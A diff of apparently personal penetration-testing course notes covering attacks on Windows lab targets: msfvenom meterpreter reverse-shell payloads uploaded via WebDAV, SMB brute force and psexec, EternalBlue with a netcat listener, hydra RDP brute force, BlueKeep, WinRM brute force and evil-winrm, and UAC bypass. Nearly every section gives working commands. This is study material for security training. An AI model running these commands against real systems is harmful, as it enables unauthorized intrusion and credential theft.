@@ -2,11 +2,11 @@
 Exploiting WebDAV With Metasploit 
 
 - Start with nmap scan on target to confirm that IIS is running and WebDav is configured 
-	- *nmap -sV -p 80 --script=http-enum target* 
+	- `*nmap -sV -p 80 --script=http-enum target* `
 - Now lets try to start with a meterpreter session (reverse shell) 
 	- MSFvenom is a tool that allows you to generate a payload that provide you with remote/remote access with system (Msfvenom can generate payloads in different formats, such as executable files, shellcode, dynamic-link libraries (DLLs), JavaScript, Python scripts, and more.) 
-- *msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your own ip) LPORT=port that is open on your system -f asp > meterpreter.asp* 
-	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > meterpreter.asp 
+- `*msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your own ip) LPORT=port that is open on your system -f asp > meterpreter.asp* `
+	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > meterpreter.asp `
 		- - `msfvenom`: This is the command to execute the msfvenom tool.
 		- `-p windows/meterpreter/reverse_tcp`: This parameter specifies the payload to be generated. In this case, it is using the "meterpreter" payload, which is a versatile payload that provides advanced functionality and allows interactive control of the compromised system. It is designed for Windows targets and uses a reverse TCP connection.
 		- `LHOST=10.10.5.2`: This parameter specifies the **local IP address (host)** for the reverse connection. You should replace it with the IP address of the system where the listener (the system that will receive the connection) is running. In this case, it is set to `10.10.5.2`.
@@ -24,26 +24,25 @@ Exploiting WebDAV With Metasploit
 		    
 		    In summary, the `windows/meterpreter/reverse_tcp` payload establishes a reverse TCP connection from the target machine to the attacker's machine, while the `meterpreter.asp` file is the output file that contains the payload code in ASP format.
 		    
-Now... moving to cadaver 
-- use cadaver to get sudo shell: cadaver http://target-ip/webdav
-	- 'ls' to list the files 
-	- use **put** to upload the file that you created: put /root/meterpreter.asp 
+Now... moving to **cadaver** 
+ http://target-ip/webdav
+	- '`ls`' 
+	- use `put` to upload the file that you created: `put /root/meterpreter.asp `
 - before executing the malicious file we need to set up a listener/handler that will receive the reverse connection from target system and then send the stage which will give you a meterpreter session when executed 
-	- start up metasploit framework console session: **service postgresql start && msfconsole**
-		-  "service postgresql start": This command starts the PostgreSQL service. PostgreSQL is an open-source relational database management system. The "service" command is used to manage system services in many Linux distributions. In this case, it's starting the PostgreSQL service.
+	- start up metasploit framework console session: `service postgresql start && msfconsole`
+		-  `"service postgresql start"`: This command starts the PostgreSQL service. PostgreSQL is an open-source relational database management system. The "service" command is used to manage system services in many Linux distributions. In this case, it's starting the PostgreSQL service.
 			- PostgreSQL is one of the supported databases for Metasploit, and it can be used as a data store for various features and functionalities within the framework. By default, Metasploit uses an SQLite database, but using PostgreSQL can offer better performance and scalability, especially when dealing with larger datasets or multiple concurrent users.
-			- The command "service postgresql start" is used to start the PostgreSQL service if it is installed on the system. It ensures that the PostgreSQL service is up and running, allowing Metasploit to connect to and utilize a PostgreSQL database.
-		-  "&&": This is the logical AND operator in shell scripting. It allows you to execute multiple commands sequentially, with the second command executing only if the first command succeeds (i.e., returns an exit status of 0). If the first command fails, the second command won't be executed.
-		- "msfconsole": This command launches the Metasploit Framework console. Metasploit is a widely-used open-source penetration testing framework that provides various tools for exploiting vulnerabilities in computer systems. The "msfconsole" command starts the interactive command-line interface for the Metasploit Framework, where you can execute various commands and modules for penetration testing purposes.
+			- The command `"service postgresql start"` is used to start the PostgreSQL service if it is installed on the system. It ensures that the PostgreSQL service is up and running, allowing Metasploit to connect to and utilize a PostgreSQL database.
+		- ` "&&"`: This is the logical AND operator in shell scripting. It allows you to execute multiple commands sequentially, with the second command executing only if the first command succeeds (i.e., returns an exit status of 0). If the first command fails, the second command won't be executed.
+		- `"msfconsole"`: This command launches the Metasploit Framework console. Metasploit is a widely-used open-source penetration testing framework that provides various tools for exploiting vulnerabilities in computer systems. The "msfconsole" command starts the interactive command-line interface for the Metasploit Framework, where you can execute various commands and modules for penetration testing purposes.
 		- By combining these commands using "&&", the shell will start the PostgreSQL service and, if successful, proceed to launch the Metasploit Framework console.
 
 - Setting up handler/listener in metasploit by using metasploit module : 
-	- use multi/handler 
-	- set payload windows/meterpreter/reverse_tcp  (let op dat jouw payload naam overeenkomt met wat je hier invoert)
-	- show options 
-	- set LHOST  yourip
-	- set LPORT  openport 
-	- run 
+	- `use multi/handler `
+	- `set payload windows/meterpreter/reverse_tcp`  (let op dat jouw payload naam overeenkomt met wat je hier invoert)
+	- `show options `
+	- `set LHOST  yourip`
+	- `set LPORT  openport `
 - execute malicious payload by clicking on the file name in webdav browser 
 - run sysinfo to see if it was successfull 
 - run getuid to check your privileges 
@@ -52,9 +51,8 @@ delete shell.asp will delete the file, this is good to do once you have access, 
 
 We have a second option using metasploit 
 
-- search iis upload ![[Pasted image 20230703111527.png]]
-- use exploit/windows/iis/iis_webdav_upload_asp
-	- show options 
+- `search` `iis` `upload` ![[Pasted image 20230703111527.png]]
+- `use exploit/windows/iis/iis_webdav_upload_asp`
 	- set  HttpUsername bob  
 	- set  HttpPassword password_123321
 	- set RHOST to targtet ip 
@@ -63,15 +61,9 @@ We have a second option using metasploit
 	- exploit (this will start reverse tcp handler)
 
 
-
-------------------------- LAB -------------------------
-
-![[Pasted image 20230703112538.png]] 
-
-![[Pasted image 20230703121659.png]] ![[Pasted image 20230703121957.png]]
 ![[Pasted image 20230703122802.png]]
 ![[Pasted image 20230703122811.png]]
--- 
+
 
 ## Exploiting SMB With PsExec 
 
@@ -106,36 +98,27 @@ It's worth noting that PsExec requires administrative privileges on the remote s
 	- after obtaining legitimate user account and password, we use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell 
 
 
-- start with service version detection and default script with nmap: nmap -sV -sC 
+- `nmap -sV -sC `
 	- Message signing enabled but not required means you can authenticate with this system via PsExec  ![[Pasted image 20230703124308.png]]
 - Perform bruteforce with Metasploit module to get username and password that we can use for psexec 
-	- service postgresql start && msfconsole 
-	- search smb_login 
+	- `service postgresql start && msfconsole `
+	- `search smb_login `
 		- The auxiliary modules are mainly used for information gathering 
 	- use module and show options 
-			- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
-			- set PASS_FILE /usr/share/metasploit/metasploit-framework/data/wordlists/unix_passwords.txt 
-			- set RHOST targetip
-			- set verbose false (als je niet alle attempts wilt zien)
+			- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt `
+			- `set PASS_FILE /usr/share/metasploit/metasploit-framework/data/wordlists/unix_passwords.txt `
+			- `set RHOST targetip`
+			- `set verbose false` (als je niet alle attempts wilt zien)
 
 open new tab 
 
-- psexec.py (allows you to authenticate with target system)
-	- psexec.py Adminstrator@targetip command_that_you_want_to_execute 
-		- psexec.py Adminstrator@targetip cmd.exe ![[Pasted image 20230703125815.png]]
+- `psexec.py `(allows you to authenticate with target system)
+	- `psexec.py Adminstrator@targetip command_that_you_want_to_execute `
+		- `psexec.py Adminstrator@targetip cmd.exe `![[Pasted image 20230703125815.png]]
 		- extend this attack with metasploit module to get meterpreter session 
-			- search psexec 
-			- use exploit/windows/smb/psexec 
-			- show options (set rhost to targetip and set smbpassword en username )
-
------- LAB -------- 
-**Objective:** Exploit the SMB service to get a meterpreter on the target and retrieve the flag!
-- Dictionaries to use:
-- /usr/share/metasploit-framework/data/wordlists/common_users.txt
-- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
-
-![[Pasted image 20230703152541.png]]![[Pasted image 20230703153551.png]]
-![[Pasted image 20230703154518.png]]
+			- `search psexec `
+			- `use exploit/windows/smb/psexec `
+			- `show options` (set rhost to targetip and set smbpassword en username )
 
 ### Exploiting Windows MS17-010SMB Vulnerability (EternalBlue) - CVE-2017-0144
 
@@ -151,27 +134,25 @@ open new tab
 
 Demo 
 
-- Nmap to check smb service: **sudo nmap -sV -p 445 -O target** 
+- Nmap to check smb service: `**sudo nmap -sV -p 445 -O target** `
 	- -O to check operating system 
-- To check if target is vulnerable for eternal blue exploit use the following nmap script: **sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target** 
+- To check if target is vulnerable for eternal blue exploit use the following nmap script: `**sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target** `
 
 Manual exploitation: Tool used: https://github.com/3ndG4me/AutoBlue-MS17-010 
 1. Clone the repository (in kali repository) (check requirement install python)
 2. navigate into shellcode directory 
-3. give the shell_prep.sh executable permissions: chmod +x shell_prep.sh 
-4. execute the bash script: ./shell_prep.sh 
+3. give the` shell_prep.sh` executable permissions: chmod +x shell_prep.sh 
+4. execute the bash script: `./shell_prep.sh `
 5. say yes to msfvenom, add ip of kali vm (ifconfig), Lport (the port you want to listen to for the connection once the payload is executed on the target), choose regular shell, select stageless payload  ![[Pasted image 20230704140223.png]]
-6. set up netcat listner in a different terminal: nc -nvlp 1234 
-7. chmod +x externalblue_exploit7.py![[Pasted image 20230704140431.png]]![[Pasted image 20230704140522.png]]
-			green = executable 
-8. run the exploit: python eternalblue_exploit7.py targetip shellcode/sc_x64.bin 
+6. set up `netcat listner` in a different terminal: `nc -nvlp 1234 `
+7. `chmod +x externalblue_exploit7.py`
+8. run the exploit: `python eternalblue_exploit7.py targetip shellcode/sc_x64.bin` 
 9. go to terminel with the netcat listner - you see a command shell on the target system 
 
 Automatically exploit eternelblue 
 1. open msfconsole 
 2. search eternalblue (aux will tell you if the system is vulnerable) (when you know tha the target is vulnerable use the exploit)
-3. use: ![[Pasted image 20230704140841.png]]
-4. run exploit after fixing the options 
+
 
 
 ## Exploiting RDP 
@@ -183,25 +164,19 @@ Automatically exploit eternelblue
 
 demo 
 
-- Perform nmap scan - port scan on target 
+- Perform `nmap scan - port scan` on target 
   OR
-- service postgresql start &&msfconsole
-- search rdp_scanner (aux/scanner/rdp/rdp_scanner), set options 
+- ` service postgresql ``start &&msfconsole`
+- `search rdp_scanner` (aux/scanner/rdp/rdp_scanner), set options 
 
 Bruteforce rdp
-- Use hydra: **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://targetip  -s rdp'port**
+- Use hydra: `**hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://targetip  -s rdp'port**`
 	- you can reduce the bruteforce speed with hydra,the default is 16 but you can change it to make sure that you dont cause damage to the customer you are pentesting 
 	- you need to add -s the port because if you do not add the port it will assume the default rdp port 
-- authenticate with credentials found in target: xfreerdp /u:administrator /p:qwertyuiop /v:targetip 
+- authenticate with credentials found in target: `xfreerdp /u:administrator /p:qwertyuiop /v:targetip `
 	- `xfreerdp`: This is the command to launch the FreeRDP client. used to initiate a remote desktop session - It will establish a graphical connection to the remote system, allowing you to interact with its desktop environment as if you were physically present at that machine. 
 	- /u: specify the username used for the remote desktop session, /p is the password and /v is the target ip or hostname of the target system 
 	- zet achter het targetip:port als de default port anders is anders kan je niet connecten 
-
-------------- Lab --------------------
-![[Pasted image 20230705135430.png]]
-![[Pasted image 20230705140236.png]]
-flag: port-number-3333![[Pasted image 20230705140914.png]]
-
 
 ### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep) 
 
@@ -215,16 +190,15 @@ flag: port-number-3333![[Pasted image 20230705140914.png]]
 - Targeting Kernel space memory and applications can cause system crashes 
 
 demo 
-- run nmap to check for rdp: sudo nmap -p 3389 targetip 
+- run nmap to check for rdp: `sudo nmap -p 3389 targetip `
 - mfsconsole to check if target if vulnerable
 	- search BlueKeep 
 	- use the aux module and set options 
 	- use 1 (it selects the module at index 1 in the current module category.)
-	- set options of exploit module 
 	- you need to manually configure the version of windows that you are targeting: show targets 
 	- set target (number of target you need) 
-	- exploit 
-	- ![[Pasted image 20230705150616.png]] the size needs to be modified if it is to high because it will crash the target system 
+
+	- the size needs to be modified if it is to high because it will crash the target system 
 	    --> be carefull with kernel exploit because they can crash a system and cause data loss 
 
 
@@ -255,25 +229,18 @@ Demo
 - Perform nmap scan to check if winrm is enabled and running 
 - when you cannot identify port 5985 (or 5986): run nmap on exact port 
 - new terminal: launch crackmapexec 
-	- start the bruteforce: **crackmapexec winrm  targetip -u adminstrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt** 
+	- start the bruteforce: `**crackmapexec winrm  targetip -u adminstrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt** `
 	- execute arbitrary windows command on target: 
-		- crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "whoami"
-		- crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "systeminfo"
+		- `crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "whoami"`
+		- `crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "systeminfo"`
 Can we obtain a command shell session? Yes! 
 1) one way is with evil-winrm.rb:
-	- **evil-winrm.rb -u adminstrator -p 'tinkerbell' -i targetip**
+	- `**evil-winrm.rb -u adminstrator -p 'tinkerbell' -i targetip**`
 2) Metasploit 
-	- service postgresql && msfconsole 
-	- search winrm_script and use winrm_script_exec 
-	- set FORCE_VBS true, set password and username 
+	- `service postgresql && msfconsole `
+	- `search winrm_script and use winrm_script_exec `
+	- `set FORCE_VBS true, set password and username `
 		- By setting "force_vbs" to true, you are instructing the exploit module to force the execution of the specified script as a VBScript (VBS) file instead of a PowerShell script. This can be useful in scenarios where PowerShell execution is restricted or detected, but VBScript execution is allowed.
-
------ Lab ---- 
-
-![[Pasted image 20230705170156.png]]
-![[Pasted image 20230705170348.png]]
-
-![[Pasted image 20230705171023.png]]
 
 ## Windows Kernel Exploits 
 
@@ -311,7 +278,7 @@ goal is to elevate privileges
 - module in msf will enumerate all vulnerabilities for windows 7: suggester (it will show which exploits you can use to elevate your privliges![[Pasted image 20230705183219.png]]
 - use the command background to put sessions in the background - type sessions to list active sessions or jobs, enter session number to go to the session you want to bring back 
 - 
--WATCH THIS VIDEO AGAIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
+-**WATCH THIS VIDEO AGAIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!** 
 
 
 
@@ -347,11 +314,8 @@ In order to elevate privileges by bypassing UAC, you will need access to a user 
 ---
 
 1. Perform an Nmap scan on the target system to gather information about open ports and services.
-    
 2. Try to access the web server on the target system by connecting to port 80.
-    
 3. Start up the Metasploit Framework:
-    
     - Search for the exploit targeting the Rejetto HTTP File Server (HFS) vulnerability, which is a lightweight web server software.
     - Configure the exploit by setting the required options.
     - Perform basic local enumeration:
@@ -363,11 +327,9 @@ In order to elevate privileges by bypassing UAC, you will need access to a user 
 	        - Run the command `net localgroup administrators` to verify that the current user is part of the local administrators group. Ensure that the "Administrator" account is listed within the administrators group. This indicates that the user can execute programs with elevated privileges.
 	          
 1. In a new window:
-    
     - Generate the payload using `msfvenom`: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe`.
       
 5. In another new Metasploit console window:
-    
     - Set up a listener using the `multi/handler` module in Metasploit.
     - Configure the listener by setting the payload to `windows/meterpreter/reverse_tcp` and specifying LHOST as your IP and LPORT as 1234.
     - Run the listener and then return to the previous Meterpreter session (part 2).
